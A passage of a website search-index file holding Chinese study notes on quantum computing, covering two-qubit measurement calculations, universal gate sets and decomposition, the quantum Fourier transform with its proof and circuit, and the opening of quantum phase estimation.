\\left\\lvert \\left\\langle \\psi \\lvert \\alpha \\right\\rangle \\right\\rvert^2 \\]"},{"location":"cs/quantum/chapter2/#_16","title":"\u91cf\u5b50\u7ebf\u8def\u548c\u6d4b\u91cf\u64cd\u4f5c","text":"<p>\u628a\u6d4b\u91cf\u64cd\u4f5c\u4f5c\u4e3a\u91cf\u5b50\u7ebf\u8def\u7684\u4e00\u90e8\u5206\uff0c\u6709\u65f6\u4e5f\u88ab\u79f0\u4e3a\u6d4b\u91cf\u95e8\uff0c\u539f\u7406\u5373\u6295\u5f71\u6d4b\u91cf\u3002</p> <p>\u53cc\u6bd4\u7279\u91cf\u5b50\u7535\u8def\u6574\u4f53\u6d4b\u91cf</p> <p>\u5bf9\u4e8e\u5982\u4e0b\u7684\u53cc\u6bd4\u7279\u91cf\u5b50\u7535\u8def\uff1a</p> <p></p> <p>\u5bf9\u5176\u8fdb\u884c\u6574\u4f53\u6d4b\u91cf\uff1a</p> <ol> <li> <p>T1 \u65f6\u523b\uff1a</p> \\[     \\begin{aligned}         \\left\\lvert \\psi_1 \\right\\rangle &amp;= (X \\otimes H) \\left\\lvert 00 \\right\\rangle \\\\         &amp;= (         \\begin{bmatrix}             0 &amp; 1 \\\\             1 &amp; 0         \\end{bmatrix}         \\otimes         \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             1 &amp; 1 \\\\             1 &amp; -1         \\end{bmatrix}         )         \\left\\lvert 00 \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 &amp; 0 &amp; 1 &amp; 1 \\\\             0 &amp; 0 &amp; 1 &amp; -1 \\\\             1 &amp; 1 &amp; 0 &amp; 0 \\\\             1 &amp; -1 &amp; 0 &amp; 0         \\end{bmatrix}         \\begin{bmatrix}             1 \\\\             0 \\\\             0 \\\\             0         \\end{bmatrix} \\\\         &amp;= \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 \\\\             0 \\\\             1 \\\\             1         \\end{bmatrix} \\\\         &amp;= \\frac{1}{\\sqrt{2}} (\\left\\lvert 10 \\right\\rangle + \\left\\lvert 11 \\right\\rangle)     \\end{aligned} \\] </li> <li> <p>T2 \u65f6\u523b\uff0c\u7ecf\u8fc7 CNOT \u95e8\uff1a</p> \\[     \\begin{aligned}         \\left\\lvert \\psi_2 \\right\\rangle &amp;= \\mathrm{CNOT} \\left\\lvert \\psi_1 \\right\\rangle \\\\         &amp;=         \\begin{bmatrix}             1 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 1 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 1 \\\\             0 &amp; 0 &amp; 1 &amp; 0         \\end{bmatrix}         \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 \\\\             0 \\\\             1 \\\\             1         \\end{bmatrix} \\\\         &amp;= \\frac{1}{\\sqrt{2}}(\\left\\lvert 10 \\right\\rangle + \\left\\lvert 11 \\right\\rangle)     \\end{aligned} \\] </li> <li> <p>T3 \u65f6\u523b\uff0c\u8fdb\u884c\u6574\u4f53\u6d4b\u91cf\uff0c\u5206\u522b\u4f5c\u7528\u56db\u4e2a\u6295\u5f71\u7b97\u5b50\u3002</p> <ul> <li> <p>\u4f7f\u7528\u6d4b\u91cf\u64cd\u4f5c \\(M_{00} = \\left\\lvert 00 \\right\\rangle \\left\\langle 00 \\right\\rvert\\)\uff0c\u6d4b\u91cf\u7ed3\u679c\u4e3a 00 \u7684\u6982\u7387\u4e3a\uff1a</p> \\[     \\begin{aligned}         P(\\left\\lvert 00 \\right\\rangle) &amp;= \\left\\langle \\psi_2 \\right\\lvert M_{00}^\\dagger M_{00} \\left\\lvert \\psi_2 \\right\\rangle \\\\         &amp;= \\left\\langle \\psi_2 \\right\\lvert M_{00} \\left\\lvert \\psi_2 \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 &amp; 0 &amp; 1 &amp; 1         \\end{bmatrix}         \\begin{bmatrix}         1 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 0 \\\\         0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix}         \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 \\\\             0 \\\\             1 \\\\             1         \\end{bmatrix} \\\\         &amp;= 0     \\end{aligned} \\] <p>\u53ef\u77e5\uff0c\u91cf\u5b50\u6001\u4e0d\u53ef\u80fd\u574d\u7f29\u5230 \\(\\left\\lvert 00 \\right\\rangle\\)\u3002</p> </li> <li> <p>\u5176\u4ed6\u4e09\u79cd\u60c5\u51b5\u540c\u7406\u3002</p> </li> </ul> </li> </ol> <p>\u53cc\u6bd4\u7279\u91cf\u5b50\u7535\u8def\u90e8\u5206\u6d4b\u91cf</p> <p>\u5bf9\u4e8e\u5982\u4e0b\u7684\u53cc\u6bd4\u7279\u91cf\u5b50\u7535\u8def\uff1a</p> <p></p> <p>\u53ea\u5bf9\u4f4e\u4f4d\u91cf\u5b50\u6bd4\u7279\u8fdb\u884c\u6d4b\u91cf\uff0c\u5219\u6b64\u65f6\u7684\u4e24\u79cd\u6d4b\u91cf\u77e9\u9635\u4e3a\uff1a</p> \\[     \\begin{aligned}         M_{0}^{q_0} &amp;= M_{00} + M_{01} =         \\begin{bmatrix}             1 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix} +         \\begin{bmatrix}             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 1 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix} =         \\begin{bmatrix}             1 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 1 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix} \\\\         M_{1}^{q_0} &amp;= M_{10} + M_{11} =         \\begin{bmatrix}             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 1 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix} +         \\begin{bmatrix}             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 1         \\end{bmatrix} =         \\begin{bmatrix}             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 1 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 1         \\end{bmatrix}     \\end{aligned} \\] <p>\u6d4b\u91cf\u540e\u5f97\u5230\u7684\u6982\u7387\u5206\u522b\u4e3a\uff1a</p> \\[     \\begin{aligned}         P_{q_0}(\\left\\lvert 0 \\right\\rangle) &amp;= \\left\\langle \\psi_2 \\right\\lvert M_{0}^{q_0} \\left\\lvert \\psi_2 \\right\\rangle         = \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 &amp; 0 &amp; 1 &amp; 1         \\end{bmatrix}         \\begin{bmatrix}             1 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 1 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0         \\end{bmatrix}         \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 \\\\             0 \\\\             1 \\\\             1         \\end{bmatrix}         = 0 \\\\         P_{q_0}(\\left\\lvert 1 \\right\\rangle) &amp;= \\left\\langle \\psi_2 \\right\\lvert M_{1}^{q_0} \\left\\lvert \\psi_2 \\right\\rangle         = \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 &amp; 0 &amp; 1 &amp; 1         \\end{bmatrix}         \\begin{bmatrix}             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 0 \\\\             0 &amp; 0 &amp; 1 &amp; 0 \\\\             0 &amp; 0 &amp; 0 &amp; 1         \\end{bmatrix}         \\frac{1}{\\sqrt{2}}         \\begin{bmatrix}             0 \\\\             0 \\\\             1 \\\\             1         \\end{bmatrix}         = 1     \\end{aligned} \\] <p>\u6d4b\u91cf\u540e\uff0c\u91cf\u5b50\u6001\u574d\u7f29\u4e3a</p> \\[     \\left\\lvert \\psi_3 \\right\\rangle = \\frac{M_{1}^{q_0} \\left\\lvert \\psi_2 \\right\\rangle}{\\sqrt{P_{q_0}(\\left\\lvert 1 \\right\\rangle)}} = \\frac{1}{\\sqrt{2}}(\\left\\lvert 10 \\right\\rangle + \\left\\lvert 11 \\right\\rangle) \\]"},{"location":"cs/quantum/chapter2/#_17","title":"\u91cf\u5b50\u6001\u533a\u5206\u516c\u8bbe","text":"<p>\u91cf\u5b50\u6d4b\u91cf\u7684\u539f\u7406\u7684\u4e00\u5927\u5e94\u7528\u662f\u533a\u5206\u91cf\u5b50\u7cfb\u7edf\u4e2d\u4e0d\u540c\u7684\u91cf\u5b50\u6001\u3002</p> <ul> <li> <p>\u5982\u679c\u4e00\u7ec4\u6001\u5411\u91cf \\(\\{\\left\\lvert \\psi_i \\right\\rangle\\}\\) \u662f\u6b63\u4ea4\u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u5b9a\u4e49\u6d4b\u91cf\u7b97\u5b50 \\(M_i = \\left\\lvert \\psi_i \\right\\rangle \\left\\langle \\psi_i \\right\\rvert\\)\uff0c\u5bf9\u4e8e\u5176\u4e2d\u7684\u4e00\u4e2a\u672a\u77e5\u89d2\u6807\u7684\u6001\u5411\u91cf \\(\\left\\lvert \\psi_k \\right\\rangle\\)\uff0c\u7528\u8fd9\u7ec4\u6d4b\u91cf\u7b97\u5b50\u8fdb\u884c\u6d4b\u91cf\uff0c\u53ea\u6709\u5f53 \\(i = k\\) \u65f6\uff0c\u6709\uff1a</p> \\[     p(i) = \\left\\langle \\psi_i \\right\\lvert M_i \\left\\lvert \\psi_i \\right\\rangle = 1 \\] <p>\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u6709 \\(p(i) = 0\\)\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u533a\u5206\u51fa\u4e0d\u540c\u7684\u91cf\u5b50\u6001\u3002</p> </li> <li> <p>\u5982\u679c\u6001\u5411\u91cf\u4e0d\u6b63\u4ea4\uff0c\u5219\u4e0d\u5b58\u5728\u4e00\u7ec4\u6d4b\u91cf\u7b97\u5b50\u53ef\u4ee5\u5b8c\u5168\u533a\u5206\u8fd9\u4e9b\u6001\u5411\u91cf\uff0c\u56e0\u4e3a\u4e00\u4e2a\u6001\u5411\u91cf\u53ef\u4ee5\u5206\u89e3\u4e3a\u5176\u4ed6\u6001\u5411\u91cf\u4e0a\u7684\u5206\u91cf\uff0c\u5bfc\u81f4 \\(p(i) &lt; 1\\)\u3002</p> </li> </ul>"},{"location":"cs/quantum/chapter2/#_18","title":"\u901a\u7528\u91cf\u5b50\u95e8","text":"<p>\u901a\u7528\u91cf\u5b50\u95e8\uff08Universal Quantum Gate\uff09\u662f\u4e00\u79cd\u80fd\u591f\u5728\u91cf\u5b50\u8ba1\u7b97\u4e2d\u5b9e\u73b0\u4efb\u610f\u91cf\u5b50\u64cd\u4f5c\u7684\u95e8\u3002</p> <p>\u4ee5\u4e0b\u7684\u95e8\u96c6\u5408\u662f\u901a\u7528\u7684\uff1a</p> <ul> <li>\u5355\u91cf\u5b50\u6bd4\u7279\u95e8\u548c CNOT \u95e8\u662f\u901a\u7528\u7684\u3002</li> <li>\u901a\u7528\u95e8\u7684\u6807\u51c6\u96c6\u5408\uff0c\u7531 H \u95e8\u3001\u76f8\u4f4d\u95e8\u3001CNOT \u95e8\u548c \\(\\pi/8\\) \u95e8\u7ec4\u6210\u3002</li> <li>H \u95e8\u3001\u76f8\u4f4d\u95e8\u3001CNOT \u95e8\u548c Toffoli \u95e8\u3002</li> </ul>"},{"location":"cs/quantum/chapter2/#_19","title":"\u91cf\u5b50\u95e8\u5206\u89e3","text":"<p>\u901a\u7528\u91cf\u5b50\u95e8\u53ef\u4ee5\u7528\u6765\u5bf9\u4efb\u610f\u7684\u9149\u64cd\u4f5c\u8fdb\u884c\u8fd1\u4f3c\u3002\u8fd9\u79cd\u8fd1\u4f3c\u7684\u65b9\u6cd5\u88ab\u79f0\u4e3a\u91cf\u5b50\u95e8\u5206\u89e3\uff08Quantum Gate Decomposition\uff09\u6216\u91cf\u5b50\u95e8\u903c\u8fd1\uff08Quantum Gate Approximation\uff09\u3002</p> <p>\u57fa\u672c\u601d\u60f3\uff1a\u5c06\u76ee\u6807\u9149\u64cd\u4f5c\u5206\u89e3\u4e3a\u4e00\u7cfb\u5217\u66f4\u7b80\u5355\u7684\u91cf\u5b50\u95e8\u7684\u4e58\u79ef\uff0c\u901a\u8fc7\u5408\u7406\u9009\u62e9\u548c\u7ec4\u5408\u8fd9\u4e9b\u57fa\u672c\u91cf\u5b50\u95e8\uff0c\u5e76\u5bf9\u5b83\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6b65\u903c\u8fd1\u76ee\u6807\u9149\u64cd\u4f5c\u3002</p> <p>\u5206\u89e3\u7684\u7cbe\u5ea6\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u95e8\u96c6\u5408\u548c\u903c\u8fd1\u65b9\u6cd5\u7684\u590d\u6742\u7a0b\u5ea6\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528\u66f4\u591a\u7684\u95e8\u548c\u66f4\u590d\u6742\u7684\u95e8\u5e8f\u5217\u53ef\u4ee5\u63d0\u4f9b\u66f4\u7cbe\u786e\u7684\u903c\u8fd1\u7ed3\u679c\u3002</p> <p>\u5e38\u89c1\u7684\u91cf\u5b50\u95e8\u5206\u89e3\u65b9\u6cd5\u5305\u62ec\uff1a</p> <ul> <li>\u5e94\u7528\u57fa\u4e8e\u6cf0\u52d2\u7ea7\u6570\u5c55\u5f00\u7684\u903c\u8fd1\u65b9\u6cd5\uff0c\u5c06\u76ee\u6807\u9149\u64cd\u4f5c\u8fd1\u4f3c\u4e3a\u4e00\u7cfb\u5217\u57fa\u672c\u95e8\u7684\u4e58\u79ef\u3002</li> <li>\u5229\u7528\u901a\u7528\u91cf\u5b50\u95e8\u96c6\u5408\u4e2d\u7684\u95e8\u8fdb\u884c\u5206\u89e3\u3002</li> <li>\u4f7f\u7528\u4f18\u5316\u7b97\u6cd5\uff0c\u4f8b\u5982\u57fa\u4e8e\u68af\u5ea6\u4e0b\u964d\u7684\u65b9\u6cd5\uff0c\u627e\u5230\u9002\u5408\u7684\u95e8\u5e8f\u5217\u548c\u53c2\u6570\u6765\u903c\u8fd1\u76ee\u6807\u9149\u64cd\u4f5c\u3002</li> </ul>"},{"location":"cs/quantum/chapter2/#_20","title":"\u91cf\u5b50\u95e8\u5206\u89e3\u4ee3\u4ef7","text":"<p>Solovay-Kitaev \u5b9a\u7406\u8868\u660e\uff0c\u5bf9\u4efb\u610f\u7684\u5355\u91cf\u5b50\u6bd4\u7279\u95e8\uff0c\u5982\u679c\u8981\u6c42\u7cbe\u5ea6\u4e3a \\(\\epsilon\\)\uff0c\u5219\u9700\u8981 \\(\\mathcal{O}(\\log^c(1/\\epsilon))\\) \u4e2a\u95e8\u6765\u903c\u8fd1\u3002\u5bf9\u4e8e\u6709 \\(m\\) \u4e2a\u95e8\u7684\u91cf\u5b50\u7cfb\u7edf\u4ee5\u53ca\u7cbe\u5ea6\u4e3a \\(\\epsilon\\) \u7684\u8fd1\u4f3c\uff0c\u9700\u8981 \\(\\mathcal{O}(m \\log^c(m/\\epsilon))\\) \u4e2a\u95e8\u3002</p>"},{"location":"cs/quantum/chapter2/#_21","title":"\u91cf\u5b50\u56fe\u7075\u673a\u548c\u91cf\u5b50\u7535\u8def\u6a21\u578b","text":"<p>\u6ca1\u5565\u5199\u7684\u3002</p>"},{"location":"cs/quantum/chapter3/","title":"\u91cf\u5b50\u7b97\u6cd5","text":""},{"location":"cs/quantum/chapter3/#_2","title":"\u91cf\u5b50\u5085\u7acb\u53f6\u53d8\u6362","text":""},{"location":"cs/quantum/chapter3/#_3","title":"\u79bb\u6563\u5085\u7acb\u53f6\u53d8\u6362","text":"<p>\u5c06\u79bb\u6563\u4fe1\u53f7\u4ece\u65f6\u57df\u8f6c\u6362\u5230\u9891\u57df\u3002</p> <p>\u79bb\u6563\u5085\u7acb\u53f6\u53d8\u6362\uff1a</p> \\[     \\begin{aligned}         &amp;\\{x_j\\} \\xrightarrow{\\mathrm{DFT}} \\{y_k\\} \\\\         &amp;y_k = \\frac{1}{\\sqrt{N}} \\sum_{j=0}^{N-1} x_j e^{\\frac{2\\pi i}{N} jk}     \\end{aligned} \\] <p>\u9006\u79bb\u6563\u5085\u7acb\u53f6\u53d8\u6362\uff1a</p> \\[     \\begin{aligned}         &amp;\\{y_k\\} \\xrightarrow{\\mathrm{IDFT}} \\{x_j\\} \\\\         &amp;x_j = \\frac{1}{\\sqrt{N}} \\sum_{k=0}^{N-1} y_k e^{-\\frac{2\\pi i}{N} jk}     \\end{aligned} \\]"},{"location":"cs/quantum/chapter3/#_4","title":"\u91cf\u5b50\u5085\u7acb\u53f6\u53d8\u6362","text":"<p>\u91cf\u5b50\u5085\u91cc\u53f6\u53d8\u6362\uff08QFT\uff09\u7684\u4f5c\u7528\u662f\u5c06\u91cf\u5b50\u6001\u4ece\u8ba1\u7b97\u57fa \\(\\{\\left\\lvert j \\right\\rangle\\}\\) \u8f6c\u6362\u5230\u9891\u57df\u57fa \\(\\{\\left\\lvert k \\right\\rangle\\}\\)\u3002\u632f\u5e45\u5e8f\u5217 \\(\\{x_j\\}\\) \u88ab\u8f6c\u6362\u4e3a \\(\\{y_k\\}\\)</p> \\[     \\begin{aligned}         &amp;\\sum_{j=0}^{N-1} x_j \\left\\lvert j \\right\\rangle \\xrightarrow{\\mathrm{QFT}} \\sum_{k=0}^{N-1} y_k \\left\\lvert k \\right\\rangle \\\\         &amp;y_k = \\frac{1}{\\sqrt{N}} \\sum_{j=0}^{N-1} x_j e^{\\frac{2\\pi i}{N} jk}     \\end{aligned} \\] <p>\u4f5c\u4e3a\u91cf\u5b50\u7b97\u7b26\u4e3a\uff1a</p> \\[     \\mathrm{QFT}\\left\\lvert j \\right\\rangle = \\frac{1}{\\sqrt{N}} \\sum_{k=0}^{N-1} e^{\\frac{2\\pi i}{N} jk} \\left\\lvert k \\right\\rangle \\]"},{"location":"cs/quantum/chapter3/#qft","title":"QFT \u7684\u5f20\u91cf\u57fa\u5f62\u5f0f","text":"<p>\u89c4\u5b9a\u8bb0\u6cd5\uff1a</p> <ul> <li>\u57fa\u6001 \\(\\left\\lvert j \\right\\rangle\\) \u8868\u793a\u4e3a \\(\\left\\lvert \\overline{j_1 j_2 \\cdots j_n} \\right\\rangle\\)\uff0c\u5176\u4e2d \\(j = j_1 2^{n-1} + j_2 2^{n-2} + \\cdots + j_n 2^0\\)\u3002</li> <li>\\(\\overline{0.j_1 j_2 \\cdots j_n}\\) \u8868\u793a\u4e8c\u8fdb\u5236\u5c0f\u6570 \\(j_1 2^{-1} + j_2 2^{-2} + \\cdots + j_n 2^{-n}\\)\u3002</li> </ul> <p>\u4f7f\u7528 \\(n\\) \u4e2a\u91cf\u5b50\u6bd4\u7279\u8fdb\u884c QFT\uff0c\u5171\u6709 \\(N = 2^n\\) \u4e2a\u57fa\u6001\u3002QFT \u53ef\u4ee5\u5199\u6210\uff1a</p> \\[     \\begin{aligned}         \\mathrm{QFT}\\left\\lvert j \\right\\rangle &amp;= \\frac{1}{\\sqrt{N}} \\sum_{k=0}^{N-1} e^{\\frac{2\\pi i}{N} jk} \\left\\lvert k \\right\\rangle \\\\         \\mathrm{QFT}\\left\\lvert \\overline{j_1 j_2 \\cdots j_n} \\right\\rangle &amp;= \\frac{1}{\\sqrt{2^n}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_n}} \\left\\lvert 1 \\right\\rangle) \\otimes \\cdots \\otimes (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2 \\cdots j_n}} \\left\\lvert 1 \\right\\rangle)     \\end{aligned} \\] <p>Proof</p> \\[     \\begin{aligned}         \\mathrm{QFT}\\left\\lvert j \\right\\rangle &amp;= \\frac{1}{\\sqrt{2^n}} \\sum_{k=0}^{2^n-1} \\exp(\\frac{2\\pi i}{2^n} jk) \\left\\lvert k \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2^n}} \\sum_{k_1=0}^{1} \\cdots \\sum_{k_n=0}^{1} \\exp(\\frac{2\\pi i}{2^n} j \\sum_{l=1}^{n} k_l 2^{n-l}) \\left\\lvert k_1 k_2 \\cdots k_n \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2^n}} \\sum_{k_1=0}^{1} \\cdots \\sum_{k_n=0}^{1} \\bigotimes_{l=1}^{n} \\exp(\\frac{2\\pi i}{2^n} j k_l 2^{n-l}) \\left\\lvert k_l \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2^n}} \\bigotimes_{l=1}^{n} \\sum_{k_l=0}^{1} \\exp(\\frac{2\\pi i}{2^n} j k_l 2^{n-l}) \\left\\lvert k_l \\right\\rangle \\\\         &amp;= \\frac{1}{\\sqrt{2^n}} \\bigotimes_{l=1}^{n} (\\left\\lvert 0 \\right\\rangle + \\exp(2\\pi i j 2^{-l}) \\left\\lvert 1 \\right\\rangle)     \\end{aligned} \\] <p>\u7531\u4e8e \\(e^{2\\pi i} = 1\\)\uff0c\u6240\u4ee5\u53ef\u4ee5\u628a \\(j 2^{-l}\\) \u7684\u6574\u6570\u90e8\u5206\u7565\u53bb\uff0c\u5f97\u5230\uff1a</p> \\[     \\begin{aligned}         \\mathrm{QFT}\\left\\lvert j \\right\\rangle &amp;= \\frac{1}{\\sqrt{2^n}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_n}} \\left\\lvert 1 \\right\\rangle) \\otimes \\cdots \\otimes (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2 \\cdots j_n}} \\left\\lvert 1 \\right\\rangle)     \\end{aligned} \\] <p>\u5355\u91cf\u5b50\u6bd4\u7279 QFT</p> <p>\u8003\u8651\u5355\u91cf\u5b50\u6bd4\u7279\u4e0b\u7684 QFT\uff1a</p> \\[     \\mathrm{QFT}_1 \\left\\lvert j \\right\\rangle = \\frac{1}{\\sqrt{2}} \\sum_{k=0}^{1} e^{\\frac{2 \\pi i}{2} jk} \\left\\lvert k \\right\\rangle \\] <p>\u5bf9\u4e8e \\(\\left\\lvert 0 \\right\\rangle\\) \u548c \\(\\left\\lvert 1 \\right\\rangle\\)\uff0c\u6709\uff1a</p> \\[     \\begin{aligned}         \\mathrm{QFT}_1 \\left\\lvert 0 \\right\\rangle &amp;= \\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle) \\\\         \\mathrm{QFT}_1 \\left\\lvert 1 \\right\\rangle &amp;= \\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle)     \\end{aligned} \\] <p>\u6240\u4ee5\uff0c\u5355\u91cf\u5b50\u6bd4\u7279\u7684 QFT \u548c Hadamard \u95e8\u7b49\u4ef7\u3002</p> <p>\u53cc\u91cf\u5b50\u6bd4\u7279 QFT</p> <p>\u53cc\u91cf\u5b50\u6bd4\u7279\u4e0b\u7684 QFT\uff1a</p> \\[     \\mathrm{QFT}_2 \\left\\lvert j \\right\\rangle = \\frac{1}{2} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_2}} \\left\\lvert 1 \\right\\rangle) \\otimes (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2}} \\left\\lvert 1 \\right\\rangle) \\] <p>\u5bf9\u4e8e\u8ba1\u7b97\u57fa \\(\\left\\lvert 10 \\right\\rangle\\) \u6709\uff1a</p> \\[     \\begin{aligned}         \\mathrm{QFT}_2 \\left\\lvert 10 \\right\\rangle &amp;= \\frac{1}{2} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.0}} \\left\\lvert 1 \\right\\rangle) \\otimes (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.10}} \\left\\lvert 1 \\right\\rangle) \\\\         &amp;= \\frac{1}{2} (\\left\\lvert 0 \\right\\rangle + \\left\\lvert 1 \\right\\rangle) \\otimes (\\left\\lvert 0 \\right\\rangle - \\left\\lvert 1 \\right\\rangle) \\\\         &amp;= \\frac{1}{2} (\\left\\lvert 00 \\right\\rangle - \\left\\lvert 01 \\right\\rangle + \\left\\lvert 10 \\right\\rangle - \\left\\lvert 11 \\right\\rangle)     \\end{aligned} \\]"},{"location":"cs/quantum/chapter3/#qft_1","title":"QFT \u7684\u91cf\u5b50\u7535\u8def","text":"<p>\u5b9a\u4e49\u5355\u91cf\u5b50\u6bd4\u7279\u65cb\u8f6c\u95e8\uff1a</p> \\[     R_k =     \\begin{bmatrix}         1 &amp; 0 \\\\         0 &amp; e^{\\frac{2\\pi i}{2^k}}     \\end{bmatrix} \\] <p>\u6784\u5efa\u5982\u4e0b\u91cf\u5b50\u7535\u8def\uff1a</p> <p>\u6267\u884c\u8fc7\u7a0b\uff1a</p> <ol> <li>\u7ecf\u8fc7\u4e00\u4e2a \\(H\\) \u95e8\u540e\uff0c\u91cf\u5b50\u6001\u53d8\u4e3a \\(\\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1}} \\left\\lvert 1 \\right\\rangle)\\left\\lvert j_2 \\cdots j_n \\right\\rangle\\)\u3002</li> <li>\u5f53 \\(j_2 = \\left\\lvert 1 \\right\\rangle\\) \u65f6\uff0c\u6267\u884c\u53d7\u63a7\u65cb\u8f6c\u95e8 \\(R_2\\)\uff0c\u91cf\u5b50\u6001\u53d8\u4e3a \\(\\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2}} \\left\\lvert 1 \\right\\rangle)\\left\\lvert j_3 \\cdots j_n \\right\\rangle\\)\u3002</li> <li>\u540c\u7406\uff0c\u6267\u884c\u6240\u6709\u4f5c\u7528\u4e8e\u7b2c\u4e00\u4e2a\u91cf\u5b50\u6bd4\u7279\u7684\u53d7\u63a7\u65cb\u8f6c\u95e8\uff0c\u5f97\u5230 \\(\\frac{1}{\\sqrt{2}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2 \\cdots j_n}} \\left\\lvert 1 \\right\\rangle)\\)\u3002</li> <li>\u540c\u7406\uff0c\u6700\u540e\u5f97\u5230 \\(\\frac{1}{\\sqrt{2^n}} (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_1 j_2 \\cdots j_n}} \\left\\lvert 1 \\right\\rangle)(\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_2 \\cdots j_n}} \\left\\lvert 1 \\right\\rangle) \\cdots (\\left\\lvert 0 \\right\\rangle + e^{2\\pi i \\overline{0.j_n}} \\left\\lvert 1 \\right\\rangle)\\)\u3002</li> <li>\u6700\u540e\u518d\u52a0\u4e00\u7cfb\u5217 \\(\\mathrm{SWAP}\\) \u95e8\uff0c\u5f97\u5230 QFT \u7684\u91cf\u5b50\u7535\u8def\u3002</li> </ol> <p>QFT \u7684\u91cf\u5b50\u95e8\u590d\u6742\u5ea6\u4e3a \\(\\mathcal{O}(n^2)\\)\u3002</p> <p>\u53cc\u91cf\u5b50\u6bd4\u7279 QFT \u7535\u8def</p> <p></p>"},{"location":"cs/quantum/chapter3/#_5","title":"\u91cf\u5b50\u76f8\u4f4d\u4f30\u8ba1","text":"<p>\u91cf\u5b50\u76f8\u4f4d\u4f30\u8ba1\uff08QPE\uff09\u7528\u4e8e\u4f30\u8ba1\u7ed9\u5b9a\u91cf\u5b50\u6001\u7684\u76f8\u4f4d\u4fe1\u606f\u3002</p>"},{"location":"cs/quantum/chapter3/#_6","title":"\u57fa\u672c\u76ee\u6807","text":"<p>\u5df2\u77e5\u9149\u77e9\u9635 \\(U\\) \u548c\u5176\u672c\u5f81\u6001 \\(\\left\\lvert \\mu \\right\\rangle\\)\uff0c\u5bf9\u5e94\u672c\u5f81\u503c\u4e3a \\(e^{2\\pi i \\varphi}\\)\uff0c\u4f30\u8ba1\u5176\u4e2d\u76f8\u4f4d\u7684\u503c \\(\\varphi \\in \\left[0, 1\\right)\\)\u3002</p>"},{"location":"cs/quantum/chapter3/#qpe","title":"QPE \u91cf\u5b50\u7535\u8def","text":""},{"location":"cs/quantum/chapter3/#_7","title":"\u7b2c\u4e00\u9636\u6bb5","text":"<p>\u5728 \\(R_p\\) \u4e2d\uff0c\u4ece\u4e0b\u5f80\u4e0a\u8bbe\u91cf\u5b50\u6001\u4e3a \\(\\left\\lvert j_1 \\right\\rangle, \\left\\lvert j_2 \\right\\rangle, \\cdots, \\left\\lvert j_n \\right\\rangle\\)\uff0c\u5219\uff1a</p> \\[     